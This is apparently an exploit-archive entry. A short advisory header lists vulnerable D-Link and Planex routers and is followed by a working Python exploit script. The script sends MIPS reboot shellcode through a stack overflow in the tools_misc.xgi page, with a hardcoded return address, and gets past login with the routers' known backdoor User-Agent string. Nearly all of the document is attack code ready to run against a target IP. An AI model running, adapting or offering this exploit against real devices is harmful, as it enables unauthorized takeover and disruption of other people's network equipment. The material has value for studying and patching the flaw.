'''source: https://www.securityfocus.com/bid/63234/info

Multiple Vendors are prone to a stack-based buffer-overflow vulnerability.

Exploiting this vulnerability may allow attackers to execute arbitrary code in the context of the affected devices.

The following are vulnerable:

D-Link DIR-120
D-Link DI-624S
D-Link DI-524UP
D-Link DI-604S
D-Link DI-604UP
D-Link DI-604
D-Link DIR-100
D-Link TM-G5240
PLANEX COMMUNICATIONS BRL-04UR
PLANEX COMMUNICATIONS BRL-04R
PLANEX COMMUNICATIONS BRL-04CW '''

import sys
import urllib2

try:
	url = 'http://%s/Tools/tools_misc.xgi?domain=a&set/runtime/diagnostic/pingIp=' % sys.argv[1]
except Exception, e:
	print str(e)
	print 'Usage: %s <target ip>' % sys.argv[0]
	sys.exit(1)

# This is the actual payload; here it is a simple reboot shellcode.
# This payload size is limited to about 200 bytes, otherwise you'll crash elsewhere in /bin/webs.
payload  = "\x3c\x06\x43\x21" # lui     a2,0x4321
payload += "\x34\xc6\xfe\xdc" # ori     a2,a2,0xfedc
payload += "\x3c\x05\x28\x12" # lui     a1,0x2812
payload += "\x34\xa5\x19\x69" # ori     a1,a1,0x1969
payload += "\x3c\x04\xfe\xe1" # lui     a0,0xfee1
payload += "\x34\x84\xde\xad" # ori     a0,a0,0xdead
payload += "\x24\x02\x0f\xf8" # li      v0,4088
payload += "\x01\x01\x01\x0c" # syscall 0x40404

# The payload is split up; some of it before the return address on the stack, some after.
# This little snippet skips over the return address during execution.
# It assumes that your shellcode will not be using the $fp or $t9 registers.
move_sp_fp = "\x03\xa0\xf0\x21" # move $fp, $sp
jump_code =  "\x27\xd9\x02\xd4" # addiu $t9, $fp, 724
jump_code += "\x03\x21\xf8\x08" # jr $t9
jump_code += "\x27\xE0\xFE\xFE" # addiu $zero, $ra, -0x102

# Stitch together the payload chunk(s) and jump_code snippet
shellcode_p1 = move_sp_fp + payload[0:68] + jump_code + "DD"
if len(shellcode_p1) < 86:
	shellcode_p1 += "D" * (86 - len(shellcode_p1))
	shellcode_p2 = ""
else:
	shellcode_p2 = "DD" + payload[68:]

# Build the overflow buffer, with the return address and shellcode
# libc.so base address and ROP gadget offset for the DIR-100, revA, v1.13
# libc_base = 0x2aaee000
# ret_offset = 0x3243C
buf = shellcode_p1 + "\x2A\xB2\x04\x3C" + shellcode_p2

# Normally only admins can access the tools_misc.xgi page; use the backdoor user-agent to bypass authentication
req = urllib2.Request(url+buf, headers={'User-Agent' : 'xmlset_roodkcableoj28840ybtide'})
urllib2.urlopen(req)